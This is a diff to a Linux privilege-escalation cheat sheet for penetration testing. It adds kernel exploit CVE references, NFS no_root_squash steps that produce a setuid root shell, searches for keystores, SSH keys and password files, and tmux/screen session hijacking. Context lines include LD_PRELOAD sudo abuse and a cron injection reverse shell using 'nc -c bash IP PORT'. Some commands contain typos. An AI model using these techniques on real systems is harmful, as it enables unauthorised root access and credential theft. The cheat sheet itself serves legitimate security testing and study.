@@ -24,6 +24,21 @@ dmesg | grep Linux # Print or control the kernel ring buffer
 ls /boot | grep vmlinuz- # Grep the name the Linux kernel executable within the boot partition
 ```
 
+##### Know exploits
+
+- [CVE-2009-1185](https://nvd.nist.gov/vuln/detail/CVE-2009-1185): udev
+  - [Linux Kernel 2.6 (Debian 4.0 / Ubuntu / Gentoo) Udev < 1.4.1](http://www.madirish.net/370)
+- [CVE-2010-1146](https://nvd.nist.gov/vuln/detail/CVE-2010-1146): ReiserFS filesystem
+  - Linux kernel 2.6.33.2 and earlier
+- [CVE-2009-2692](https://nvd.nist.gov/vuln/detail/CVE-2009-2692): sock_sendpage
+  - Linux kernel 2.6.0 through 2.6.30.4 and 2.4.4 through 2.4.37.4
+- [CVE-2016-5195](https://nvd.nist.gov/vuln/detail/CVE-2016-5195): Dirty cow
+  - Linux kernel 2.x through 4.x before 4.8.3
+
+For more, refer to the following link [linux-kernel-exploits](https://github.com/SecWiki/linux-kernel-exploits)
+
+For more information about that technique refer to [T1068 - Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068/)
+
 ###### Network
 
 > / / / To Finish
@@ -57,6 +72,8 @@ Netstat options:
 # Print environment variables
 printenv
 # Search for drives
+showmount -a # List both the client hostname or IP address and mounted directory in host:dir format.
+showmount -e # Show the NFS server’s export list.
 df -h
 ls /dev 2>/dev/null | grep -i "sd"
 cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
@@ -88,10 +105,11 @@ ls -la /root/.*_history #
 cat /var/apache2/config.inc
 cat /var/lib/mysql/mysql/user.MYD
 cat /root/anaconda-ks.cfg
-find / -name *.bak -print 2>/dev/null # Commonly used to signify a backup copy of a file  
+find / -name *.bak -print 2>/dev/null # Commonly used to signify a backup copy of a file
+find / -name *.jks -print 2>/dev/null
 find / -name .htpasswd -print 2>/dev/null
+find / -name .git -print 2>/dev/null
 find / -name .ipfs -print 2>/dev/null
-.vault-token
 find / -name ssh_host_dsa_key* -print 2> /dev/null
 find / -name ssh_host_rsa_key* -print 2> /dev/null
 find / -name ssh_host_key* -print 2> /dev/null
@@ -128,6 +146,14 @@ locate password | more
   ipfs get HASH # Download IPFS objects
   ```
 
+- **\*.jks**: repository of security certificates, either authorization certificates or public key certificates, plus corresponding private keys, used for instance in SSL encryption.
+
+  ```bash
+  keytool -list -v -keystore keystore.jks
+  ```
+
+- **.git**: cc [Files101](Files101.md)
+
 ##### Authentication Logs
 
 The authorization Log tracks usage of authorization systems, the mechanisms for authorizing users which prompt for user passwords, such as the Pluggable Authentication Module (PAM) system, the sudo command, remote logins to sshd and so on.
@@ -144,19 +170,55 @@ Keep authentication logs for both successful or failed logins, and authenticatio
 ##### Misconfigured services
 
 ```bash
+cat /etc/exports                     # NFS server configuration file
+cat /etc/lib/nfs/etab
 cat /etc/ssh/ssh_config
 cat /etc/ssh/sshd_config
 cat /etc/syslog.conf                 # Syslog
 cat /etc/chttp.conf                  #
 cat /etc/lighttpd.conf               # Lighttpd
-cat /etc/cups/cupsd.conf             # CUPS scheduler
+cat /etc/cups/cupsd.conf             # CUPS scheduler (Print Server)
+cat /etc/printer.conf                # Printer configuration file for cups
 cat /etc/inetd.conf                  # internet service daemon
 cat /etc/apache2/apache2.conf        # Apache 2
-cat /etc/                            # MySQL
+cat /etc/......                      # MySQL
+ls /etc/pure-ftpf/conf
+car /etc/pure-ftpf/pure-ftpf.conf
 cat /etc/httpd/conf/httpd.conf
 cat /opt/lampp/etc/httpd.conf
 ls -aRl /etc/ | awk '$1 ~ /^.*r.*/' # Displays all configuration files.
 ```
+
+- **/etc/exports**: Contains configurations and permissions of which folders/file systems are exported to remote users.
+  -> Search for **no_root_squash**. If present, you are root of the file systems/folders with that setting
+  -> Search for **anonuid** and **anonuid**. Those are the uid and gid of the anonymous account mounting the system.
+  If it's set to **0**, you will be root.
+
+  ```bash
+  # 1. Place a binary in it
+  cp /bin/bash /VULNERABLE_SHARE
+  # 2. Mount the share
+  mount -t nfs SERVER:/VULNERABLE_SHARE /mnt/
+  # 3. Get root
+  chown root:root bash && chmod u+s bash
+  ```
+
+- **/etc/ssh/ssh_config**:
+
+- **/etc/ssh/sshd_config**:
+  -> Search for **PermitRootLogin**, if set to **yes**, you can login as root via SSH
+  -> Search for **AllowUsers** in order to enumerate the users allowed to connect using SSH
+
+- **/etc/cups/cupsd.conf**: You could found credentials or others usefull information in it
+- **/etc/printer.conf**: You could found credentials or others usefull information in it
+
+###### *If you don't know, now you know: **[NFS Root Squashing](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/4/html/security_guide/s2-server-nfs-noroot)**
+
+Root squash is a technique to void privilege escalation on the client machine via suid executables Setuid. Without root squash, an attacker can generate suid binaries on the server that are executed as root on other client, even if the client user does not have superuser privileges.
+
+Root squash is a special mapping of the remote superuser (root) identity when using identity authentication
+
+Under root squash, a client's uid 0 (root) is mapped to 65534 (nobody).
 
 ##### All Files/Folder
 
@@ -208,6 +270,32 @@ chsh
 cp /bin/sh /current/directory; sh
 ```
 
+#### Screen sessions
+
+Screen is a terminal multiplexer, which means that it allows you to start a screen session and then open any number of windows (virtual terminals) inside that session.
+
+```bash
+screen -ls # List the current running screen
+screen -r ID # Restore to a specified screen session
+```
+
+#### tmux
+
+tmux is an open-source terminal multiplexer for Unix-like operating systems. It allows multiple terminal sessions to be accessed simultaneously in a single window.
+
+```bash
+tmux ls
+ps aux | grep tmux # Search for tmux consoles not using default folder for sockets
+tmux -S /tmp/dev_sess ls # List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
+```
+
+Here below are the command to attach to a specified session
+
+```bash
+tmux attach -d -t NAME
+tmux -S /tmp/dev_sess attach -t 0
+```
+
 ### Users
 
 #### User Enumeration
@@ -215,6 +303,9 @@ cp /bin/sh /current/directory; sh
 ```bash
 lastlog # Reports the most recent login of all users
 last -f /var/log/wtmp # wtmp is a file on the Linux, Solaris, and BSD operating systems that keeps a history of all logins and logouts.
+ls -la /home # Enumerate users (via /home)
+cat /etc/passwd # Enumerate users (via /etc/passwd)
+cat /etc/passwd | egrep -e '/bin/(ba)?sh' # Enumerate users that has shell access
 ```
 
 #### Group Membership Privigele Escalation
@@ -333,6 +424,8 @@ find / -perm -u=s -type f -print 2>/dev/null # Search for program with the SUID
 find / -perm -g=s -type f -print 2>/dev/null | sed 's:.*/::'  # Search for program with the SGID
 ```
 
+For more information about that technique refer to [T1548.001 - Abuse Elevation Control Mechanism: Setuid and Setgid](https://attack.mitre.org/techniques/T1548/001/)
+
 ###### *If you don't know, now you know: [SUID](https://linux.die.net/man/2/setuid) & [SGID](https://linux.die.net/man/3/setgid)*
 
 - **SUID** (**S**et owner **U**ser **ID** up on execution) is defined as giving temporary permissions to a user to run a program/file with the permissions of the file owner rather that the user who runs.
@@ -375,6 +468,8 @@ gcc -fPIC -shared -o evil.so evil.c -nostartfiles
 sudo LD_PRELOAD=evil.so nano
 ```
 
+For more information about that technique refer to [T1574.006 - Hijack Execution Flow: LD_PRELOAD](https://attack.mitre.org/techniques/T1574/006/)
+
 ###### *If you don't know, now you know: [Sudoers](https://help.ubuntu.com/community/Sudoers)*
 
 The /etc/sudoers file controls who can run what commands as what users on what machines and can also control special things such as whether you need a password for particular commands.
@@ -415,7 +510,7 @@ Cron examines all stored crontabs and checks each job to see if it needs to be r
 2. Search for wildcard injection vulnerability such as tar, chown and chmod (cc Wildcard)
 3. Search for execution within the script that use a folder or file that can be changed to '; nc -c bash IP PORT
 
-##### $PATH
+#### $PATH
 
 ```bash
 echo $PATH
@@ -504,6 +599,7 @@ top
 cat /etc/services
 ps aux | grep root # Displays services run by root
 ps -ef | grep root # Displays services run by root
+ss -lnpt # Dumps socket statistics
 ```
 
 ### Binaries installed
@@ -643,4 +739,6 @@ Array
 https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/
 https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/
 - CAP_SYS_PTRACE: https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc
+- NFS Root Squashing: https://haiderm.com/category/priviledge-escalation/
+- tmux: https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
 - https://reboare.gitbooks.io/booj-security/content/general-linux/privilege-escalation.html
